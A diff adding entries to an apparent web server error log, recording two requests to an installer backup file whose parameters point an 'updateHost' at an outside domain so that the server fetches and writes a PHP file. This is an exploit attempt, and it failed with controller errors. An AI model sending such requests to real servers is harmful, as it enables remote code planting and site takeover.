@@ -1,0 +1,6 @@
+[ 2020-07-29T18:53:29+08:00 ] 1.56.12.245 /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=demodata.php&updateHost=http://imcaccess.applinzi.com/
+ERR: 无法加载控制器:Index.php
+
+[ 2020-07-29T22:20:43+08:00 ] 60.11.221.1 /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=demodata.php&updateHost=http://imcaccess.applinzi.com/
+ERR: 无法加载控制器:Index.php
+
